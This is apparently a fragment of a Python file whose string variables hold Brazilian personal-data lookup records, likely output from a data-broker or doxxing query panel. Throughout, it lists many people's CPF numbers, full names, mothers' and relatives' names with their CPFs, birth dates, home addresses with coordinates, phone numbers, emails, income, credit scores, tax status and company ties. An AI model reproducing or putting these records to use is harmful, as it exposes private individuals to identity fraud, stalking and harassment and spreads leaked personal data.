            • NOME: DANILO COUTINHO OLIVEIRA
            • CPF/CNPJ: 54855985287
            • MÃE: MARIA GIRLENE OLIVEIRA COUTINHO
            • NASCIMENTO: 10/05/1997
            • SEXO: M - MASCULINO

            • 🏡 ENDEREÇO 

            • LOGRADOURO: FRANCISCO PEDROSA 
            • NÚMERO: 1228
            • BAIRRO: N/A
            • CIDADE: ALTAMIRA
            • UF: PA
"""

dado23 = """

            • NOME: DANILO COUTINHO OLIVEIRA
            • CPF/CNPJ: 18928305748
            • MÃE: CLAUDETE DE ALMEIDA COUTINHO OLIVEIRA
            • NASCIMENTO: 30/06/2003
            • SEXO: M - MASCULINO

            • 🏡 ENDEREÇO 

            • LOGRADOURO: SANTA MARIA DA VITORIA 
            • NÚMERO: 15
            • BAIRRO: MUTUA
            • CIDADE: SAO GONCALO
            • UF: RJ
"""

dado24 = """

            • CPF: 23526254753
            • NOME: LUIZ CARLOS DE SOUZA PINTO
            • NASCIMENTO: 16/09/1947
            • NOME MÃE: MARIA OSE PEREIRA DE SOUZA
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS

"""

dado25 = """

            • CPF: 23487666120
            • NOME: LUIZ CARLOS DE SOUZA
            • NASCIMENTO: 05/12/1949
            • NOME MÃE: MARIA DO CARMO DE SOUZA
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS

"""

dado26 = """

            • CPF: 23464828620
            • NOME: LUIZ CARLOS DE SOUZA
            • NASCIMENTO: 08/07/1952
            • NOME MÃE: 
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS

"""

dado27 = """

            • CPF: 07238501864
            • NOME: LUIZ CARLOS DE SOUZA
            • NASCIMENTO: 23/10/1967
            • NOME MÃE: EDELAIDE DA SILVA SOUZA
            • SEXO: M

            • TELEFONES


            • CELULARES
            12997524351
            12988642686


            • VEÍCULOS
            • MARCA: 
            • MODELO: H/HONDA CG 125 TODAY
            • ANO: 1990
            • MARCA: 
            • MODELO: VW/LOGUS CLI 1.8
            • ANO: 1995

"""

dado28 = """
            • CPF: 07187916655
            • NOME: LUIZ CARLOS MENDES DE SOUZA
            • NASCIMENTO: 02/01/1985
            • NOME MÃE: NEUSA PINTO MENDES
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS

"""

dado29 = """

            • CPF: 07216424549
            • NOME: LUIZ CARLOS RODRIGUES DE SOUZA PRIMO
            • NASCIMENTO: 28/11/1938
            • NOME MÃE: 
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS

"""

dado30 = """

            • CPF: 07076178710
            • NOME: LUIZ CARLOS TOSTA DE SOUZA
            • NASCIMENTO: 07/06/1973
            • NOME MÃE: BERENICE TOSTA DE SOUZA
            • SEXO: M

            • TELEFONES


            • CELULARES
            21985093390


            • VEÍCULOS

"""

dado31 = """
            • CPF: 07056895735
            • NOME: CARLOS ALBERTO LUIZ DE SOUZA
            • NASCIMENTO: 14/11/1972
            • NOME MÃE: MARIA DA PURIFICACAO DE SOUZA
            • SEXO: M

            • TELEFONES
            2137421135


            • CELULARES
            21991735525


            • VEÍCULOS


"""

dado32 = """
            • CPF: 24872359852
            • NOME: LUIZ CARLOS DE SOUZA
            • NASCIMENTO: 15/10/1954
            • NOME MÃE: BELAMIRNA NERY DE SOUZA
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS
"""

dado33 = """
            • CPF: 24543748115
            • NOME: LUIZ CARLOS DE SOUZA MATOS
            • NASCIMENTO: 27/08/1961
            • NOME MÃE: GENI DE SOUZA MATOS
            • SEXO: M

            • TELEFONES


            • CELULARES


            • VEÍCULOS
"""

dado34 = """

            • CPF: 61166944972
            • SITUAÇÃO CADASTRAL: REGULAR
            • NOME: IOLANDA REGINA LOURENCI KAFER
            • CNS: SEM INFORMAÇÃO
            • NASCIMENTO: 20/01/1971
            • SEXO: F - FEMININO
            • ESTADO CIVIL: SOLTEIRO(A)
            • NACIONALIDADE: BRASILEIRA
            • ESCOLARIDADE: ENSINO SUPERIOR COMPLETO
            • PAI: SEM INFORMAÇÃO
            • MÃE: AURORA STEFANI LORENCI

            • TÍTULO ELEITOR

            • TÍTULO: SEM INFORMAÇÃO
            • ZONA: SEM INFORMAÇÃO
            • SEÇÃO: SEM INFORMAÇÃO

            • INFORMAÇÕES DE ÓBITO

            • NOME: SEM INFORMAÇÃO
            • DATA DO ÓBITO: Não consta.

            • REGISTRO GERAL

            • RG: 2135535
            • ORGÃO EMISSOR: SSP
            • UF EMISSÃO: SC
            • DATA: Sem informação.

            • DADOS ECONÔMICOS

            • RENDA: 5859,61
            • PODER AQUISITIVO: MEDIO ALTO
            • RENDA PODER AQUISITIVO: 5859,6085473645517
            • FAIXA PODER AQUISITIVO: De R$ 4082 at? R$ 7017

            • SCORE CSB: SEM INFORMAÇÃO
            • SCORE CSB FAIXA DE RISCO: SEM INFORMAÇÃO
            • SCORE CSBA: 913
            • SCORE CSBA FAIXA DE RISCO: BAIXISSIMO RISCO

            • PROFISSÃO

            • CBO: 141410
            • DESCRIÇÃO CBO: Comerciante varejista
            • PIS: SEM INFORMAÇÃO

            • EMPREGOS:


            • BENEFÍCIOS:

            TIPO: auxilioEmergencial
            BENEFÍCIO: AUXILIO EMERGENCIAL
            TOTAL RECEBIDO: R$ 0
            TOTAL PARCELAS RECEBIDAS: SEM INFORMAÇÃO

            TIPO: bolsaFamilia
            BENEFÍCIO: BOLSA FAMILIA
            TOTAL RECEBIDO: R$ 0
            TOTAL PARCELAS RECEBIDAS: SEM INFORMAÇÃO

            TIPO: inss
            BENEFÍCIO: INSTITUTO NACIONAL DO SEGURO SOCIAL
            TOTAL RECEBIDO: R$ 0
            TOTAL PARCELAS RECEBIDAS: SEM INFORMAÇÃO


            • ENDEREÇOS:

            CEP: 89700000 - ESTADO: SC - MUNICÍPIO: CONCORDIA - LOGRADOURO: R ATALIPIO MAGARINOS
            - BAIRRO: NULL - COMPLEMENTO: AP 1101 - NÚMERO: 348

            CEP: 89700000 - ESTADO: SC - MUNICÍPIO: CONCORDIA - LOGRADOURO: R OSVALDO ZANDAVALLI
            - BAIRRO: NULL - COMPLEMENTO: C - NÚMERO: 404

            CEP: 99700012 - ESTADO: RS - MUNICÍPIO: ERECHIM - LOGRADOURO: AV MAURICIO CARDOSO
            - BAIRRO: CENTRO - COMPLEMENTO: SL 1 - NÚMERO: 296

            CEP: 99700084 - ESTADO: RS - MUNICÍPIO: ERECHIM - LOGRADOURO: AV SETE DE SETEMBRO
            - BAIRRO: CENTRO - COMPLEMENTO: SEM INFORMAÇÃO - NÚMERO: 107


            • MUNICÍPIO DE NASCIMENTO: OURO

            • TELEFONES:

            5434423960
            TIPO: TELEFONE RESIDENCIAL
            OPERADORA: Não informado

            54981159880
            TIPO: TELEFONE MÓVEL
            OPERADORA: Não informado

            5133219557
            TIPO: TELEFONE RESIDENCIAL
            OPERADORA: Não informado

            54999823100
            TIPO: TELEFONE MÓVEL
            OPERADORA: Não informado

            54991786115
            TIPO: TELEFONE MÓVEL
            OPERADORA: Não informado

            5435223256
            TIPO: COMERCIAL
            OPERADORA: NET

            54991485158
            TIPO: CELULAR
            OPERADORA: NET

            5491515444
            TIPO: NO
            OPERADORA: NO

            5435226059
            TIPO: Não informado
            OPERADORA: Não informado

            5433219557
            TIPO: Não informado
            OPERADORA: Não informado

            54992245975
            TIPO: Não informado
            OPERADORA: TELEFONIA


            • EMAILS:

            EMAIL: iolandalorenci@hotmail.com
            PRIORIDADE: MUITO ALTA
            QUALIDADE: OTIMO
            PESSOAL: SIM
            BLACKLIST: NÃO

            EMAIL: lorencierechim@lorenci.com.br
            PRIORIDADE: ALTA
            QUALIDADE: POTENCIALMENTE BOM
            PESSOAL: NÃO
            BLACKLIST: NÃO


            • PARENTES:

            NOME: ALESIO LORENCI
            CPF: 18206751904
            PARENTESCO: IRMA(O)

            NOME: CARLOS AUGUSTO LOURENCI PITOL
            CPF: 08522040940
            PARENTESCO: SOBRINHA(O)

            NOME: LUIZ FERNANDO LORENCI JUNQUEIRA
            CPF: 07471320621
            PARENTESCO: SOBRINHA(O)

            NOME: VANDA ANA LOURENCI PITOL
            CPF: 59593172904
            PARENTESCO: IRMA(O)

            NOME: VALMIR LORENCI
            CPF: 40045196915
            PARENTESCO: IRMA(O)

            NOME: CRISTIANO LORENCI JUNQUEIRA
            CPF: 07471200642
            PARENTESCO: SOBRINHA(O)

            NOME: AURORA STEFANI LORENCI
            CPF: 94917345987
            PARENTESCO: MAE

            NOME: GABRIEL KAFER
            CPF: 02936253012
            PARENTESCO: FILHA(O)

            NOME: NEIDE CATARINA LORENCI
            CPF: 22070532968
            PARENTESCO: IRMA(O)


            • SERASA MOSAIC

            • DESCRIÇÃO: Novos moradores da comunidade
            • CLASSE: Jovens da Periferia
            • CÓDIGO NOVO: A02
            • DESCRIÇÃO NOVO: Elite urbana qualificada
            • CLASSE NOVO: Elites Brasileiras
            • CÓDIGO SECUNDÁRIO: G22
            • DESCRIÇÃO SECUNDÁRIA: Empresários estabilizados
            • OBSERVAÇÃO: SEM INFORMAÇÃO

            • EMPRESAS

            CNPJ: 08275222000200
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: SOCIO-ADMINISTRADOR
            ADMISSÃO: 21/01/2016
            DEMISSÃO: 24/07/2018

            CNPJ: 17163140000183
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: ADMINISTRADOR
            ADMISSÃO: 13/11/2012
            DEMISSÃO: 31/12/9999

            CNPJ: 17163140000183
            TIPO DE RELAÇÃO: REPRESENTANTELEGAL
            RELAÇÃO: SEM INFORMAÇÃO
            ADMISSÃO: 25/06/2019
            DEMISSÃO: 31/12/9999

            CNPJ: 21270356000115
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: SOCIO
            ADMISSÃO: 21/10/2014
            DEMISSÃO: 31/12/9999

            CNPJ: 31601497000127
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: SOCIO-ADMINISTRADOR
            ADMISSÃO: 25/09/2018
            DEMISSÃO: 06/08/2021

            CNPJ: 31601497000127
            TIPO DE RELAÇÃO: REPRESENTANTELEGAL
            RELAÇÃO: SEM INFORMAÇÃO
            ADMISSÃO: 27/06/2019
            DEMISSÃO: 31/12/9999

            CNPJ: 31601497000208
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: SOCIO-ADMINISTRADOR
            ADMISSÃO: 14/10/2019
            DEMISSÃO: 17/08/2021

            CNPJ: 40631917000109
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: SOCIO-ADMINISTRADOR
            ADMISSÃO: 29/01/2021
            DEMISSÃO: 31/12/9999

            CNPJ: 42674174000180
            TIPO DE RELAÇÃO: QSA
            RELAÇÃO: SOCIO-ADMINISTRADOR
            ADMISSÃO: 12/07/2021
            DEMISSÃO: 31/12/9999


            • DADOS IMPOSTOS

            CPF: 61166944972
            BANCO: SEM INFORMAÇÃO
            AGÊNCIA: 0000
            LOTE: 0
            ANO: 2017
            DATA LOTE: SEM INFORMAÇÃO
            STATUS: IMPOSTO A PAGAR

            CPF: 61166944972
            BANCO: SEM INFORMAÇÃO
            AGÊNCIA: 0000
            LOTE: 0
            ANO: 2016
            DATA LOTE: SEM INFORMAÇÃO
            STATUS: SALDO INEXISTENTE DE IMPOSTO A PAGAR OU A RESTITUIR

            CPF: 61166944972
            BANCO: SEM INFORMAÇÃO
            AGÊNCIA: 0000
            LOTE: 0
            ANO: 2015
            DATA LOTE: SEM INFORMAÇÃO
            STATUS: SALDO INEXISTENTE DE IMPOSTO A PAGAR OU A RESTITUIR

            CPF: 61166944972
            BANCO: SEM INFORMAÇÃO
            AGÊNCIA: SEM INFORMAÇÃO
            LOTE: SEM INFORMAÇÃO
            ANO: 2018
            DATA LOTE: SEM INFORMAÇÃO
            STATUS: IMPOSTO A PAGAR, SEM OPCAO POR DEBITO AUTOMATICO


            • COMPRAS

            PRODUTO: Condessa de Barral a Paixão do Imperador
            DETALHE: Livro com as bordas amareladas e oxidadas; interior não possui grifos e anotações; capas com sinais de manuseio\nPáginas: 259\np. 02.08.18
            QUANTIDADE: 1
            PREÇO: 17.00

"""

dado35 = """

            • CPF: 05977551592
            • NOME: INGRID SILVA SANTOS
            • SEXO: F
            • NASCIMENTO: 1996-01-15 00:00:00
            • ESCOLARIDADE: MEDIO COMPLETO
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: IVANDILDE SILVA SANTOS
            • PAI: INDEFINIDO
            • RENDA: 268
            • TÍTULO DE ELEITOR: 1

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 20027885881
            • PODER AQUISITIVO: MUITO BAIXO
            • RENDA PODER AQUISITIVO: 268
            • FAIXA PODER AQUISITIVO: 71104226177005

            • AVALIAÇÃO DE SCORE

            • CBO: 421125
            • CSB8: 639
            • CSB8 FAIXA: BAIXO
            • CSBA: 230
            • CSBA FAIXA: ALTO

            • ENDEREÇOS


            • CEP: 41190220
            • UF: BA
            • CIDADE: SALVADOR
            • LOGRADOURO: AV OITO DE DEZEMBRO
            • BAIRRO: S GONCALO
            • NÚMERO: 132
            • COMPLEMENTO: E
            • LAITUDE: -12.946604000000001
            • LONGITUDE: -38.467694999999999

            • CEP: 41185515
            • UF: BA
            • CIDADE: SALVADOR
            • LOGRADOURO: R OITO DE DEZEMBRO
            • BAIRRO: S GONCALO
            • NÚMERO: 132
            • COMPLEMENTO: E
            • LAITUDE: -12.925817000000000
            • LONGITUDE: -38.476948000000000

            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 7182346880
            • OPERADORA: DESCONHECIDA

            • TELEFONE: 71985334857
            • OPERADORA: OI

            • TELEFONE: 71988191721
            • OPERADORA: OI

            • TELEFONE: 71985278401
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 71986024949
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 71985389899
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 71987369643
            • OPERADORA: DESCONHECIDO

            • EMAILS:

            • EMAIL: innyminho@gmail.com
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • PARENTES:

            • IRPF:


            • EMPRESAS:

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Não
            • CREDITO IMOBILIARIO PREAPROVADONão
            • FINACIMENTO DE VEICULO PREAPROVADONão
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Sim
            • POSSUI LUXO Sim
            • POSSUI INVESTIMENTOS Não
            • POSSUI CARTAO DE CREDITOSim
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Não
            • POSSUI CARTAO BLACK Não
            • POSSUI CARTAO PRIME Sim
            • POSSUI CELULAR PRE PAGO Não
            • POSSUI CELULAR POS PAGO Não
            • POSSUI MILHAS ACUMULADAS Não
            • POSSUI CASA PROPRIA Não
            • POSSUI DESCONTOS Não
            • POSSUI CONTAS CORRENTES Não
            • POSSUI SEGURO AUTOMOTIVO Não
            • POSSUI PREVIDENCIA PRIVADA Sim
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Não
            • CREDITO PESSOAL 19% 
            • FINANCIAMENTO VEICULO 10% 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES 45% 
            • CARTAO PRIME 31% 
            • TV A CABO 60%
            • BANDA LARGA 57%
            • CASA PROPRIA 37%
            • CELULAR PRE PAGO39%
            • CELULAR POS PAGO25%
            • CREDITO MOBILARIO 25%
            • SEGURO AUTOMATIVO 41% 
            • SEGURO DE SAUDE 43%
            • SEGURO DE VIDA 34%
            • SEGURO RESIDENCIAL 27% 
            • INVESTIMENTOS 43% 
            • CONSIGNADO 29% 
            • PREVIDENCIA PRIVADA 55% 
            • RESGATE MILHAS 6%
            • CACADOR DESCONTOS31% 
            • FITNESS 13%
            • TURISMO 37% 
            • LUXO 7%
            • CINEFILIO 57%
            • TRANSPORTE PUBLICO 63% 
            • JOGOS ONLINE 45% 
            • VIDEO GAME 44%
            • EARLY ADOPTERS 29%

"""

dado36 = """

            • CPF: 38738596881
            • NOME: FERNANDO DOS SANTOS LIMA
            • SEXO: M
            • NASCIMENTO: 1990-05-28 00:00:00
            • ESCOLARIDADE: SUPERIOR COMPLETO
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: ANANETE FRANCA DOS SANTOS
            • PAI: INDEFINIDO
            • RENDA: 664
            • TÍTULO DE ELEITOR: 1

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 
            • PODER AQUISITIVO: BAIXO
            • RENDA PODER AQUISITIVO: 664
            • FAIXA PODER AQUISITIVO: 33951155620241

            • AVALIAÇÃO DE SCORE

            • CBO: 252105
            • CSB8: 435
            • CSB8 FAIXA: MEDIO
            • CSBA: 180
            • CSBA FAIXA: ALTISSIMO

            • ENDEREÇOS


            • CEP: 09980550
            • UF: SP
            • CIDADE: DIADEMA
            • LOGRADOURO: AV AFONSO MONTEIRO DA CRUZ
            • BAIRRO: SERRARIA
            • NÚMERO: 154
            • COMPLEMENTO: C 3
            • LAITUDE: -23.709764320000000
            • LONGITUDE: -46.609448850000000

            • CEP: 04582020
            • UF: SP
            • CIDADE: SAO PAULO
            • LOGRADOURO: R BRITO PEIXOTO
            • BAIRRO: VL CORDEIRO
            • NÚMERO: 309
            • COMPLEMENTO: FDS
            • LAITUDE: -23.618727860000000
            • LONGITUDE: -46.689553640000000

            • CEP: 04582020
            • UF: SP
            • CIDADE: SAO PAULO
            • LOGRADOURO: R BRITO PEIXOTO
            • BAIRRO: VL CORDEIRO
            • NÚMERO: 39
            • COMPLEMENTO: 
            • LAITUDE: -23.620336000000002
            • LONGITUDE: -46.690840000000001

            • CEP: 09980550
            • UF: SP
            • CIDADE: DIADEMA
            • LOGRADOURO: AV AFONSO MONTEIRO DA CRUZ
            • BAIRRO: SERRARIA
            • NÚMERO: 186
            • COMPLEMENTO: CS 4
            • LAITUDE: -23.709615710000000
            • LONGITUDE: -46.609886730000000

            • CEP: 09980550
            • UF: SP
            • CIDADE: DIADEMA
            • LOGRADOURO: AV AFONSO MONTEIRO DA CRUZ
            • BAIRRO: SERRARIA
            • NÚMERO: 186
            • COMPLEMENTO: C
            • LAITUDE: -23.709615710000000
            • LONGITUDE: -46.609886730000000

            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 1137582098
            • OPERADORA: DESCONHECIDA

            • TELEFONE: 1140554986
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 1436255096
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 1140448030
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 11971966365
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 11959744524
            • OPERADORA: DESCONHECIDO

            • EMAILS:

            • EMAIL: fernandinho__feeh@hotmail.com
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: fernandinhodopagode@hotmail.com
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • PARENTES:

            • CPF: 11937876705
            • NOME: KLEYTON SOUZA DA SILVA
            • PARENTESCO: PRIMA(O)

            • CPF: 01071095579
            • NOME: MARCIO FRANCA DOS SANTOS DE SOUZA
            • PARENTESCO: IRMA(O)

            • CPF: 65647785549
            • NOME: ALVERINA PEREIRA DE SOUZA
            • PARENTESCO: NETA(O)

            • CPF: 37161148634
            • NOME: MARIA DO CARMO PEREIRA DE SOUZA
            • PARENTESCO: SOBRINHA(O)

            • CPF: 93244037704
            • NOME: RUTH SOUZA DA SILVA
            • PARENTESCO: SOBRINHA(O)

            • CPF: 15131630860
            • NOME: MARIA APARECIDA DE SOUZA
            • PARENTESCO: SOBRINHA(O)

            • CPF: 07226826895
            • NOME: ERAN NILTON FRANCA DOS SANTOS
            • PARENTESCO: SOBRINHA(O)

            • CPF: 27658064890
            • NOME: ELIANA CANDIDO DE SOUSA
            • PARENTESCO: SOBRINHA(O)

            • CPF: 52589420587
            • NOME: ANANETE FRANCA DOS SANTOS
            • PARENTESCO: FILHA(O)

            • IRPF:

            • DOCUMENTO: 38738596881
            • COD AGÊNCIA: 0000
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 0
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL
            • CPF: 38738596881

            • DOCUMENTO: 38738596881
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL 
            • CPF: 38738596881

            • DOCUMENTO: 38738596881
            • COD AGÊNCIA: 0000
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 0
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL
            • CPF: 38738596881


            • EMPRESAS:

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Não
            • CREDITO IMOBILIARIO PREAPROVADOSim
            • FINACIMENTO DE VEICULO PREAPROVADOSim
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Sim
            • POSSUI LUXO Sim
            • POSSUI INVESTIMENTOS Não
            • POSSUI CARTAO DE CREDITOSim
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Não
            • POSSUI CARTAO BLACK Não
            • POSSUI CARTAO PRIME Não
            • POSSUI CELULAR PRE PAGO Sim
            • POSSUI CELULAR POS PAGO Sim
            • POSSUI MILHAS ACUMULADAS Sim
            • POSSUI CASA PROPRIA Sim
            • POSSUI DESCONTOS Sim
            • POSSUI CONTAS CORRENTES Não
            • POSSUI SEGURO AUTOMOTIVO Sim
            • POSSUI PREVIDENCIA PRIVADA Não
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Sim
            • CREDITO PESSOAL 38% 
            • FINANCIAMENTO VEICULO 69% 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES 56% 
            • CARTAO PRIME 33% 
            • TV A CABO 63%
            • BANDA LARGA 66%
            • CASA PROPRIA 65%
            • CELULAR PRE PAGO67%
            • CELULAR POS PAGO51%
            • CREDITO MOBILARIO 50%
            • SEGURO AUTOMATIVO 52% 
            • SEGURO DE SAUDE 36%
            • SEGURO DE VIDA 43%
            • SEGURO RESIDENCIAL 43% 
            • INVESTIMENTOS 51% 
            • CONSIGNADO 32% 
            • PREVIDENCIA PRIVADA 44% 
            • RESGATE MILHAS 73%
            • CACADOR DESCONTOS64% 
            • FITNESS 42%
            • TURISMO 49% 
            • LUXO 25%
            • CINEFILIO 60%
            • TRANSPORTE PUBLICO 69% 
            • JOGOS ONLINE 60% 
            • VIDEO GAME 77%
            • EARLY ADOPTERS 43%

"""

dado37 = """

            • CPF: 96667036534
            • NOME: LUCIANA MOURA DE CASTRO SAMPAIO
            • SEXO: F
            • NASCIMENTO: 1977-12-08 00:00:00
            • ESCOLARIDADE: SUPERIOR COMPLETO
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: CELIA MOURA DE CASTRO
            • PAI: INDEFINIDO
            • RENDA: 1304
            • TÍTULO DE ELEITOR: 2

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 
            • PODER AQUISITIVO: MEDIO BAIXO
            • RENDA PODER AQUISITIVO: 1304
            • FAIXA PODER AQUISITIVO: 508866118734

            • AVALIAÇÃO DE SCORE

            • CBO: 4221
            • CSB8: 490
            • CSB8 FAIXA: MEDIO
            • CSBA: 186
            • CSBA FAIXA: ALTISSIMO

            • ENDEREÇOS


            • CEP: 44905000
            • UF: BA
            • CIDADE: LAPAO
            • LOGRADOURO: R WILSON VILELA DOURADO
            • BAIRRO: CENTRO
            • NÚMERO: 97
            • COMPLEMENTO: 
            • LAITUDE: -11.484672000000000
            • LONGITUDE: -41.811781000000003

            • CEP: 44905000
            • UF: BA
            • CIDADE: LAPAO
            • LOGRADOURO: R WILSON VILELA DOURADO
            • BAIRRO: CENTRO
            • NÚMERO: 97
            • COMPLEMENTO: 
            • LAITUDE: -11.484672000000000
            • LONGITUDE: -41.811781000000003

            • CEP: 60352690
            • UF: CE
            • CIDADE: FORTALEZA
            • LOGRADOURO: R GENIPO FERNANDES
            • BAIRRO: QUINTINO CUNHA
            • NÚMERO: 351
            • COMPLEMENTO: 
            • LAITUDE: -3.729711680000000
            • LONGITUDE: -38.600990790000000

            • CEP: 47400000
            • UF: BA
            • CIDADE: XIQUE XIQUE
            • LOGRADOURO: R DA MATERNIDADE
            • BAIRRO: CENTRO XIQUE XIQUE
            • NÚMERO: 230
            • COMPLEMENTO: 
            • LAITUDE: -10.822951630000000
            • LONGITUDE: -42.725541960000000

            • CEP: 40296250
            • UF: BA
            • CIDADE: SALVADOR
            • LOGRADOURO: R ALBERTO PONDE
            • BAIRRO: CANDEAL
            • NÚMERO: 109
            • COMPLEMENTO: BL 1
            • LAITUDE: -12.993811900000000
            • LONGITUDE: -38.477670140000000

            • CEP: 41701050
            • UF: BA
            • CIDADE: SALVADOR
            • LOGRADOURO: R DOS FRADES
            • BAIRRO: ALPHAVILLE I
            • NÚMERO: 555
            • COMPLEMENTO: 
            • LAITUDE: -12.943728530000000
            • LONGITUDE: -38.487733030000000

            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 7332882472
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 85999259278
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 71999557751
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 7133771824
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 8532603651
            • OPERADORA: DESCONHECIDO

            • EMAILS:

            • EMAIL: lucianamcsampaio@hotmail.com
            • SCORE: OTIMO
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: sergiohumberto@hotmail.com
            • SCORE: RUIM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: lucianacastro@hotmail.com
            • SCORE: RUIM
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • PARENTES:

            • CPF: 65122240515
            • NOME: JOAO CELSO MOURA DE CASTRO
            • PARENTESCO: IRMA(O)

            • CPF: 04699146538
            • NOME: RAFAEL MOURA DE CASTRO SAMPAIO
            • PARENTESCO: MAE

            • CPF: 96662034568
            • NOME: CAROLINA MOURA DE CASTRO FONTENELE
            • PARENTESCO: IRMA(O)

            • CPF: 96667486572
            • NOME: MARCELO MOURA DE CASTRO
            • PARENTESCO: IRMA(O)

            • CPF: 11115190563
            • NOME: CELIA MOURA DE CASTRO
            • PARENTESCO: FILHA(O)

            • CPF: 04699145566
            • NOME: SAMUEL MOURA DE CASTRO SAMPAIO
            • PARENTESCO: MAE

            • CPF: 04113845549
            • NOME: LICIMAR ROCHA DE CASTRO
            • PARENTESCO: FILHA(O)

            • IRPF:

            • DOCUMENTO: 96667036534
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL
            • CPF: 96667036534


            • EMPRESAS:

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 5571999557751




            • EMAIL: sergiohumberto@hotmail.com
            • TELEFONE: 192228360




            • EMAIL: sergiohumberto@hotmail.com
            • TELEFONE: 192228360



            • PRODUTO: porta retrato bailarina
            • PREÇO: 30.00
            • QUANTIDADE: 
            • DETALHE: NULL


            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 557130338098




            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 71999557751




            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 557999557751




            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 71999557751




            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 71999557751




            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 71999557751




            • EMAIL: lucianamcsampaio@hotmail.com
            • TELEFONE: 71999557751




            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Não
            • CREDITO IMOBILIARIO PREAPROVADOSim
            • FINACIMENTO DE VEICULO PREAPROVADOSim
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Sim
            • POSSUI LUXO Sim
            • POSSUI INVESTIMENTOS Sim
            • POSSUI CARTAO DE CREDITOSim
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Sim
            • POSSUI CARTAO BLACK Sim
            • POSSUI CARTAO PRIME Sim
            • POSSUI CELULAR PRE PAGO Sim
            • POSSUI CELULAR POS PAGO Sim
            • POSSUI MILHAS ACUMULADAS Sim
            • POSSUI CASA PROPRIA Sim
            • POSSUI DESCONTOS Sim
            • POSSUI CONTAS CORRENTES Sim
            • POSSUI SEGURO AUTOMOTIVO Sim
